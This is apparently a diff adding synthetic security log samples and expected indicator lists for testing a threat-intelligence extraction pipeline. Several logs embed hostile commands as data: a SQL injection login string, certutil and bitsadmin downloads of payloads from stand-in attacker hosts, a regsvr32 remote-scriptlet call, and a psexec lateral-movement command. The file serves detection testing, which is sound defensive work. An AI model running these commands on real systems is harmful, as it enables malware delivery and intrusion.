@@ -1,0 +1,82 @@
+# Additional Test Logs for AFRETIP Pipeline
+
+## 1. Simple Text Log (save as simple_test.log)
+2025 Jun 21 15:45:30 firewall-01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:08:00 SRC=203.0.113.45 DST=192.168.1.100 LEN=40 TOS=0x00 PREC=0x00 TTL=242 ID=12345 PROTO=TCP SPT=80 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0
+
+## 2. DNS Log with Suspicious Domains (save as dns_test.log)
+{"timestamp":"2025-06-21T15:30:25.123Z","rule":{"id":"31502","level":8,"description":"Suspicious DNS query to known malware domain"},"agent":{"id":"003","name":"dns-server","ip":"192.168.1.50"},"data":{"srcip":"192.168.1.150","query":"evil-malware-site.tk","qtype":"A","answer":"185.220.100.240"},"decoder":{"name":"dns"},"full_log":"2025 Jun 21 15:30:25 dns-server named[1234]: client 192.168.1.150#54321: query: evil-malware-site.tk IN A + (192.168.1.50) response: evil-malware-site.tk 300 IN A 185.220.100.240"}
+
+## 3. Web Server Attack Log (save as web_attack.log)
+{"timestamp":"2025-06-21T16:15:42.456Z","rule":{"id":"31151","level":10,"description":"SQL injection attempt detected"},"agent":{"id":"002","name":"web-server-02","ip":"10.0.1.100"},"data":{"srcip":"93.184.216.34","url":"/login.php?user=admin'OR'1'='1--&pass=test","method":"POST","status":"403","user_agent":"Mozilla/5.0 (compatible; BadBot/1.0)","referrer":"http://malicious-scanner.com/tools"},"decoder":{"name":"apache"},"full_log":"93.184.216.34 - - [21/Jun/2025:16:15:42 +0000] \"POST /login.php?user=admin'OR'1'='1--&pass=test HTTP/1.1\" 403 1234 \"http://malicious-scanner.com/tools\" \"Mozilla/5.0 (compatible; BadBot/1.0)\" \"-\""}
+
+## 4. File Upload Malware (save as file_upload.log)
+{"timestamp":"2025-06-21T17:20:10.789Z","rule":{"id":"31155","level":12,"description":"Malicious file upload detected"},"agent":{"id":"004","name":"upload-server","ip":"172.16.1.50"},"data":{"filename":"invoice.pdf.exe","md5":"99017f6b46c4447c5b9c8ea4b5b1eaec","sha1":"b1946ac92492d2347c6235b4d2611184e5ef6d05","sha256":"ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f","size":"524288","uploader_ip":"198.51.100.42"},"syscheck":{"path":"/var/www/uploads/invoice.pdf.exe","event":"added","md5_after":"99017f6b46c4447c5b9c8ea4b5b1eaec","sha1_after":"b1946ac92492d2347c6235b4d2611184e5ef6d05","sha256_after":"ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"},"full_log":"2025-06-21 17:20:10 upload-server httpd[5678]: File uploaded: /var/www/uploads/invoice.pdf.exe from IP 198.51.100.42, size 524288 bytes, MD5: 99017f6b46c4447c5b9c8ea4b5b1eaec, SHA1: b1946ac92492d2347c6235b4d2611184e5ef6d05, SHA256: ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f. File appears to be executable masquerading as PDF. Registry key created: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateChecker. Process spawned: C:\\Windows\\System32\\svchost.exe communicating with 45.33.32.156:443"}
+
+## 5. Email Security Alert (save as email_alert.log)
+2025 Jun 21 18:10:33 mail-server postfix/smtpd[9876]: NOQUEUE: reject: RCPT from unknown[45.33.32.156]: 554 5.7.1 <phishing@evil-sender.ga>: Sender address rejected: Domain evil-sender.ga in spam blacklist; from=<phishing@evil-sender.ga> to=<victim@company.com> proto=ESMTP helo=<mail.evil-sender.ga>. Email contains suspicious URLs: http://phishing-site.cf/steal-login, https://fake-bank.tk/update-account, http://192.168.200.100:8080/malware.zip. Attachment analysis: malicious_invoice.pdf.zip contains PE32 executable, MD5: a1b2c3d4e5f6789012345678901234567890abcd, SHA256: 1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
+
+## 6. Lateral Movement Detection (save as lateral_movement.log)
+{"timestamp":"2025-06-21T19:45:18.321Z","rule":{"id":"31201","level":11,"description":"Lateral movement via SMB detected"},"agent":{"id":"005","name":"domain-controller","ip":"192.168.1.10"},"data":{"srcip":"192.168.1.75","dstip":"192.168.1.85","protocol":"SMB","action":"file_copy","src_user":"compromised_user","dst_path":"\\\\192.168.1.85\\C$\\Windows\\System32\\malicious_tool.exe","tool":"psexec.exe"},"full_log":"2025-06-21 19:45:18 domain-controller Security[4624]: Successful logon: Account Name: compromised_user, Source Network Address: 192.168.1.75, Destination: 192.168.1.85. SMB file copy: \\\\192.168.1.85\\C$\\Windows\\System32\\malicious_tool.exe. Process execution: psexec.exe \\\\192.168.1.85 -s C:\\Windows\\System32\\malicious_tool.exe. Registry modification: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MaliciousService. Network connections: 192.168.1.75:445 -> 192.168.1.85:445, 192.168.1.85:4444 -> 203.0.113.100:443"}
+
+## 7. Living Off The Land Attack (save as lolbas_attack.log)
+2025 Jun 21 20:30:45 workstation-07 Microsoft-Windows-Sysmon[1234]: Process Create: RuleName: -, UtcTime: 2025-06-21 20:30:45.123, ProcessGuid: {12345678-1234-5678-abcd-ef1234567890}, ProcessId: 2468, Image: C:\\Windows\\System32\\certutil.exe, FileVersion: 10.0.19041.1 (WinBuild.160101.0800), Description: Certificate Services Command Line, Product: Microsoft® Windows® Operating System, Company: Microsoft Corporation, OriginalFileName: CertUtil.exe, CommandLine: certutil.exe -urlcache -split -f http://attacker-server.ml/payload.dll C:\\Windows\\Temp\\legitimate.dll, CurrentDirectory: C:\\Users\\victim\\, User: WORKSTATION-07\\victim, LogonGuid: {12345678-1234-5678-abcd-ef1234567890}, LogonId: 0x12345, TerminalSessionId: 1, IntegrityLevel: Medium, Hashes: MD5=A1B2C3D4E5F6789012345678901234567890ABCD,SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF, ParentProcessGuid: {87654321-4321-8765-dcba-210fedcba987}, ParentProcessId: 1357, ParentImage: C:\\Windows\\System32\\cmd.exe, ParentCommandLine: cmd.exe /c bitsadmin /transfer UpdateJob http://evil-cdn.tk/update.exe C:\\temp\\update.exe && regsvr32 /s /u /i:http://malicious-script.ga/evil.sct scrobj.dll
+
+# Usage Instructions:
+
+1. Save the main comprehensive log as 'comprehensive_test.json'
+2. Save each additional log as separate files with suggested names
+3. Test with commands like:
+
+   # Test comprehensive log
+   sudo threat-intel dry-run --log-sample comprehensive_test.json
+
+   # Test simple text log  
+   sudo threat-intel dry-run --log-sample simple_test.log
+
+   # Test specific attack types
+   sudo threat-intel dry-run --log-sample dns_test.log
+   sudo threat-intel dry-run --log-sample web_attack.log
+   sudo threat-intel dry-run --log-sample file_upload.log
+
+# Expected IOCs to be extracted:
+
+## IP Addresses:
+- 192.168.1.100, 203.0.113.45, 185.220.100.240, 93.184.216.34, 45.33.32.156
+- 198.51.100.42, 192.168.200.100, 127.0.0.1, 10.0.0.100, 192.168.100.50
+
+## Domains:
+- evil-c2-server.tk, malware-distribution.bit, phishing-site.cf, backdoor-command.onion
+- evil-malware-site.tk, malicious-scanner.com, evil-sender.ga, fake-bank.tk
+
+## URLs:
+- http://127.0.0.1:8080/shell.ps1, https://evil-c2-server.tk/api/download
+- http://phishing-site.cf/steal-login, https://fake-bank.tk/update-account
+
+## File Hashes:
+- MD5: 5d41402abc4b2a76b9719d911017c592, 99017f6b46c4447c5b9c8ea4b5b1eaec
+- SHA1: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d, b1946ac92492d2347c6235b4d2611184e5ef6d05
+- SHA256: 2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae
+
+## File Paths:
+- C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+- C:\\Users\\Administrator\\AppData\\Local\\Temp\\malware_sample.exe
+- C:\\Windows\\Temp\\evil.dll, C:\\temp\\backdoor.js
+
+## Registry Keys:
+- HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware
+- HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence
+
+## Process Names:
+- powershell.exe, cmd.exe, rundll32.exe, regsvr32.exe, certutil.exe, bitsadmin.exe
+
+## Email Addresses:
+- attacker@evil-domain.tk, phishing@malicious-site.ga, phishing@evil-sender.ga
+
+# Expected Threat Patterns:
+- PowerShell obfuscation (encoded commands, hidden windows)
+- Living off the land (certutil, bitsadmin, regsvr32)
+- Suspicious file creation in temp directories
+- Network downloads and communications
+- Registry persistence mechanisms
+- Lateral movement via SMB
+- Email-based attacks
